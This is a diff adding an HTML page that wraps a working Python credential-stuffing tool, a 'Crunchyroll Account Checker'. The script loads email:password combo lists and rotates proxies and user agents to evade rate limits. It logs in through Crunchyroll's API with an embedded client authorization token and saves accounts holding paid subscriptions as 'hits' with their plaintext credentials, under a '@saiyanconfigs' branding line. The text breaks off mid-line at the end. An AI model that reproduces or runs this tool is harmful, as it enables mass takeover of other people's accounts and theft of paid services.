@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crunchyroll Account Checker</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            line-height: 1.6;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        pre {
+            background-color: #2d2d2d;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border-left: 4px solid #ff6600;
+        }
+        h1 {
+            color: #ff6600;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .container {
+            background-color: #252525;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .info {
+            background-color: #333;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .success {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .failure {
+            color: #f44336;
+            font-weight: bold;
+        }
+        .expired {
+            color: #FF9800;
+            font-weight: bold;
+        }
+        .free {
+            color: #9E9E9E;
+            font-weight: bold;
+        }
+        .highlight {
+            color: #ff6600;
+        }
+    </style>
+</head>
+<body>
+    <h1>Crunchyroll Account Checker</h1>
+    
+    <div class="container">
+        <div class="info">
+            <p>This HTML document contains the Python code for checking Crunchyroll account subscriptions.</p>
+            <p>Status indicators: 
+                <span class="success">Success</span>, 
+                <span class="failure">Failure</span>, 
+                <span class="expired">Expired</span>, 
+                <span class="free">Free</span>
+            </p>
+        </div>
+        
+        <pre><code>import requests
+import uuid
+import urllib.parse
+import json
+import time
+from datetime import datetime, timedelta
+import os
+import random
+from time import sleep
+
+class CrunchyrollChecker:
+    def __init__(self, username, password, proxy=None):
+        self.username = username
+        self.password = password
+        self.proxy = proxy
+        self.session = requests.Session()
+        self.request_count = 0
+        self.last_request_time = time.time()
+        self.rate_limit_wait = 5
+        self.max_retries = 3
+        
+        # User agents for rotation
+        self.user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
+            "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0"
+        ]
+        
+        self.rotate_user_agent()
+        
+        # Variables to store data
+        self.tk = None
+        self.CI = None
+        self.id = None
+        self.email = None
+        self.plan_name = None
+        self.plan_type = None
+        self.total = None
+        self.cy = None
+        self.expiry = None
+        self.remaining_days = None
+        self.country = None
+        self.kk = None
+        self.currenttime = int(time.time())
+        
+        # Load country data from JSON file
+        self.country_data = self.load_country_data()
+    
+    def load_country_data(self):
+        try:
+            if not os.path.exists("country.json"):
+                print("country.json file not found. Using fallback country data.")
+                return []
+            
+            with open('country.json', 'r', encoding='utf-8') as f:
+                content = f.read().strip()
+                
+                # Check if content is empty
+                if not content:
+                    print("country.json is empty")
+                    return []
+                
+                # Try to parse as JSON array
+                try:
+                    if content.startswith('{') and content.endswith('}'):
+                        # Looks like a single object, make it an array
+                        content = f"[{content}]"
+                    return json.loads(content)
+                except json.JSONDecodeError:
+                    pass
+                
+                # Try to parse as JSON lines
+                try:
+                    data = []
+                    for line in content.splitlines():
+                        line = line.strip()
+                        if line and line not in ['[', ']', '{', '}']:
+                            # Remove trailing commas
+                            if line.endswith(','):
+                                line = line[:-1]
+                            data.append(json.loads(line))
+                    return data
+                except json.JSONDecodeError as e:
+                    print(f"Failed to parse country.json: {e}")
+                    return []
+        except Exception as e:
+            print(f"Error loading country data: {e}")
+            return []
+    
+    def rotate_user_agent(self):
+        self.session.headers.update({
+            "User-Agent": random.choice(self.user_agents),
+            "Pragma": "no-cache",
+            "Accept": "*/*",
+            "Accept-Encoding": "gzip",
+        })
+    
+    def make_request(self, method, url, **kwargs):
+        elapsed = time.time() - self.last_request_time
+        if elapsed < 1.0:
+            sleep(1.0 - elapsed)
+        
+        retries = 0
+        while retries <= self.max_retries:
+            try:
+                proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
+                
+                if self.request_count % 3 == 0:
+                    self.rotate_user_agent()
+                
+                response = self.session.request(method, url, proxies=proxies, **kwargs)
+                self.request_count += 1
+                self.last_request_time = time.time()
+                
+                if response.status_code == 429:
+                    retry_after = int(response.headers.get('Retry-After', self.rate_limit_wait))
+                    print(f"Rate limited. Waiting {retry_after} seconds...")
+                    sleep(retry_after)
+                    self.rate_limit_wait = min(60, self.rate_limit_wait * 2)
+                    retries += 1
+                    continue
+                
+                self.rate_limit_wait = 5
+                return response
+                
+            except requests.exceptions.RequestException as e:
+                print(f"Request failed: {e}")
+                retries += 1
+                if retries <= self.max_retries:
+                    wait_time = min(2 ** retries, 60)
+                    print(f"Retrying in {wait_time} seconds...")
+                    sleep(wait_time)
+        
+        return None
+    
+    def generate_guid(self):
+        return str(uuid.uuid4())
+    
+    def url_encode(self, text):
+        return urllib.parse.quote(text)
+    
+    def date_to_unixtime(self, date_str, date_format="%Y-%m-%d"):
+        try:
+            dt = datetime.strptime(date_str, date_format)
+            return int(time.mktime(dt.timetuple()))
+        except:
+            return 0
+    
+    def get_remaining_days(self, expiry_date):
+        try:
+            expiry_dt = datetime.strptime(expiry_date, "%Y-%m-%d")
+            today = datetime.now()
+            delta = expiry_dt - today
+            return delta.days
+        except:
+            return 0
+    
+    def translate_country(self, country_code):
+        if not country_code:
+            return "Unknown"
+        
+        # Search for the country in our loaded data
+        for country in self.country_data:
+            if country.get("code", "").upper() == country_code.upper():
+                return f"{country.get('name', country_code)} {country.get('flag', '')}"
+        
+        # If not found, use fallback
+        fallback_map = {
+            "US": "United States 🇺🇸",
+            "GB": "United Kingdom 🇬🇧",
+            "CA": "Canada 🇨🇦",
+            "AU": "Australia 🇦🇺",
+            "DE": "Germany 🇩🇪",
+            "FR": "France 🇫🇷",
+            "JP": "Japan 🇯🇵",
+            "BR": "Brazil 🇧🇷",
+            "IN": "India 🇮🇳",
+            "MX": "Mexico 🇲🇽"
+        }
+        return fallback_map.get(country_code, country_code)
+    
+    def determine_plan_type(self, benefits):
+        if not benefits:
+            return "FREE"
+        
+        for benefit in benefits:
+            benefit_name = benefit.get("benefit", "").lower()
+            if "ultimate" in benefit_name:
+                return "ULTIMATE FAN"
+            elif "mega" in benefit_name:
+                return "MEGA FAN"
+            elif "fan" in benefit_name:
+                return "FAN"
+        
+        return "FREE"
+    
+    def login(self):
+        try:
+            ID = self.generate_guid()
+            US = self.url_encode(self.username)
+            PS = self.url_encode(self.password)
+            
+            url = "https://beta-api.crunchyroll.com/auth/v1/token"
+            data = f"username={US}&password={PS}&grant_type=password&scope=offline_access&device_id={ID}&device_type=SAMSUNG%20SM-S911B%2FDS"
+            
+            headers = {
+                "host": "www.crunchyroll.com",
+                "authorization": "Basic dGRnYmNwaHh4M3o5cmI3YTE4Mm06VFlGUV9lSEhiRkh0c0pOYzlFamwzWVBzMDN1VUJESFY=",
+                "x-datadog-sampling-priority": "0",
+                "etp-anonymous-id": str(uuid.uuid4()),
+                "content-type": "application/x-www-form-urlencoded"
+            }
+            
+            response = self.make_request("POST", url, data=data, headers=headers)
+            
+            if response and response.status_code == 200:
+                self.tk = response.json().get("access_token")
+                if '__cf_bm' in response.cookies:
+                    self.CI = response.cookies['__cf_bm']
+                return True
+            return False
+        except Exception as e:
+            print(f"Login error: {e}")
+            return False
+    
+    def get_account_info(self):
+        try:
+            url = "https://beta-api.crunchyroll.com/accounts/v1/me"
+            headers = {
+                "User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0",
+                "Authorization": f"Bearer {self.tk}"
+            }
+            
+            response = self.make_request("GET", url, headers=headers)
+            
+            if response and response.status_code == 200:
+                data = response.json()
+                self.email_verified = data.get("email_verified", False)
+                self.id = data.get("external_id", "")
+                self.email = data.get("email", "")
+                return True
+            return False
+        except Exception as e:
+            print(f"Account info error: {e}")
+            return False
+    
+    def get_subscription_info(self):
+        try:
+            # Get subscription details
+            url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{self.id}"
+            headers = {
+                "User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0",
+                "Authorization": f"Bearer {self.tk}"
+            }
+            
+            response = self.make_request("GET", url, headers=headers)
+            
+            if response and response.status_code == 200:
+                data = response.json()
+                self.plan_name = data.get("product", {}).get("name", "Free")
+                
+                if "next_renewal_date" in data:
+                    expiry_date = data["next_renewal_date"].split("T")[0]
+                    self.expiry = expiry_date
+                    self.kk = self.date_to_unixtime(expiry_date)
+                    self.remaining_days = self.get_remaining_days(expiry_date)
+                
+                if "country_code" in data:
+                    self.cy = data["country_code"]
+                    self.country = self.translate_country(self.cy)
+            
+            # Get benefits to determine exact plan type
+            url_benefits = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{self.id}/benefits"
+            response_benefits = self.make_request("GET", url_benefits, headers=headers)
+            
+            if response_benefits and response_benefits.status_code == 200:
+                benefits_data = response_benefits.json()
+                self.total = benefits_data.get("total", 0)
+                self.plan_type = self.determine_plan_type(benefits_data.get("items", []))
+            
+            return True
+        except Exception as e:
+            print(f"Subscription info error: {e}")
+            return False
+    
+    def check_subscription_status(self):
+        if not self.login():
+            return "Failure"
+        
+        if not self.get_account_info():
+            return "Failure"
+        
+        if not self.get_subscription_info():
+            return "Failure"
+        
+        if self.kk and self.kk > self.currenttime:
+            if (self.total and self.total > 0) or (self.plan_type != "FREE"):
+                return "Success"
+        elif self.kk and self.kk < self.currenttime:
+            return "EXPIRED"
+        elif self.plan_type == "FREE":
+            return "FREE"
+        
+        return "UNKNOWN"
+    
+    def save_hit(self):
+        try:
+            if not os.path.exists("Hits/Crunchyroll"):
+                os.makedirs("Hits/Crunchyroll")
+            if not os.path.exists("Hits/Crunchyroll/All Hits"):
+                os.makedirs("Hits/Crunchyroll/All Hits")
+            
+            # Create hit data dictionary
+            hit_data = {
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "credentials": f"{self.username}:{self.password}",
+                "email": self.username,
+                "password": self.password,
+                "email_verified": self.email_verified,
+                "plan_name": self.plan_name if self.plan_name else "N/A",
+                "plan_type": self.plan_type if self.plan_type else "N/A",
+                "expiry": self.expiry if self.expiry else "N/A",
+                "remaining_days": self.remaining_days if self.remaining_days else "N/A",
+                "country": self.country if self.country else "N/A",
+                "status": "Success"
+            }
+            
+            # Save individual hit as JSON
+            filename = self.email if self.email else self.username
+            with open(f"Hits/Crunchyroll/{filename}.json", "w", encoding='utf-8') as f:
+                json.dump(hit_data, f, indent=4, ensure_ascii=False)
+            
+            # Append to all hits JSON file
+            all_hits_file = "Hits/Crunchyroll/All Hits/hits.json"
+            
+            # Read existing hits if file exists
+            existing_hits = []
+            if os.path.exists(all_hits_file):
+                try:
+                    with open(all_hits_file, "r", encoding='utf-8') as f:
+                        existing_hits = json.load(f)
+                except json.JSONDecodeError:
+                    existing_hits = []
+                except Exception as e:
+                    print(f"Error reading all hits file: {e}")
+            
+            # Add new hit
+            existing_hits.append(hit_data)
+            
+            # Write back to file
+            with open(all_hits_file, "w", encoding='utf-8') as f:
+                json.dump(existing_hits, f, indent=4, ensure_ascii=False)
+            
+            # Also save the old text format for compatibility
+            hit_template = f"""┌─────────────「✨ 𝙷𝚒𝚝 𝙱𝚢 - @saiyanconfigs ✨ 
+
+│☛https://www.crunchyroll.com
+│☛credentials:{self.username}:{self.password}
+│☛Email:{self.username}
+│☛Password:{self.password}
+│☛Email verified: {self.email_verified}
+│☛Plan Name: {self.plan_name if self.plan_name else 'N/A'}
+│☛Plan Type: {self.plan_type if self.plan_type else 'N/A'}
+│☛Expiry: {self.expiry if self.expiry else 'N/A'}
+│☛Remaining days: {self.remaining_days if self.remaining_days else 'N/A'}
+│☛Country: {self.country if self.country else 'N/A'}
+│└───────────────
+
+"""
+            
+            with open(f"Hits/Crunchyroll/{filename}.txt", "a", encoding='utf-8') as f:
+                f.write(hit_template)
+            
+            with open("Hits/Crunchyroll/All Hits/Hits.txt", "a", encoding='utf-8') as f:
+                f.write(hit_template)
+        except Exception as e:
+            print(f"Error saving hit: {e}")
+    
+    def run(self):
+        status = self.check_subscription_status()
+        if status == "Success":
+            self.save_hit()
+            return True, status
+        return False, status
+
+def read_accounts_from_file(filename):
+    accounts = []
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if ':' in line:
+                    username, password = line.split(':', 1)
+                    accounts.append((username, password))
+    except Exception as e:
+        print(f"Error reading accounts file: {e}")
+    return accounts
+
+def read_proxies_from_file(filename):
+    proxies = []
+    try:
+        with open(filename, 'r') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(f"Error reading proxies file: {e}")
+    return proxies
+
+def save_last_index(index):
+    with open("last_index.txt", "w") as f:
+        f.write(str(index))
+
+def load_last_index():
+    try:
+        if os.path.exists("last_index.txt"):
+            with open("last_index.txt", "r") as f:
+                return int(f.read().strip())
+    except:
+        pass
+    return 0
+
+if __name__ == "__main__":
+    # Resume from last position
+    start_index = load_last_index()
+    accounts = read_accounts_from_file("test.txt")
+    proxies = read_proxies_from_file("proxies.txt") if os.path.exists("proxies.txt") else [None]
+    
+    if not accounts:
+        print("No accounts found in test.txt or file doesn't exist")
+        print("Please create test.txt with accounts in format email:password")
+        exit()
+    
+    print(f"Resuming from account {start_index + 1} of {len(accounts)}")
+    
+    # Create a set of already processed accounts
+    processed_accounts = set()
+    try:
+        with open("Hits/Crunchyroll/All Hits/hits.json", "r", encoding='utf-8') as f:
+            existing_hits = json.load(f)
+            for hit in existing_hits:
+                processed_accounts.add(hit["email"])
+    except:
+        pass
+    
+    for i in range(start_index, len(accounts)):
+        username, password = accounts[i]
+        
+        # Skip already processed accounts
+        if username in processed_accounts:
+            print(f"\nSkipping already processed account {i+1}/{len(accounts)}: {username}")
+            save_last_index(i + 1)
+            continue
+        
+        proxy = proxies[i % len(proxies)] if proxies else None
+        print(f"\nChecking account {i+1}/{len(accounts)}: {username}")
+        
+        checker = CrunchyrollChecker(username, password, proxy)
+        success, status = checker.run()
+        
+        if success:
+            print(f"✓ Valid subscription found! Status: {status}")
+            print(f"   Plan Type: {checker.plan_type}")
+            print(f"   Plan Name: {checker.plan_name}")
+            print(f"   Country: {checker.country}")
+        else:
+            print(f"✗ No valid subscription found. Status: {status}")
+        
+        # Save current position after each account
+        save_last_index(i + 1)
+        
+        if i < len(accounts)
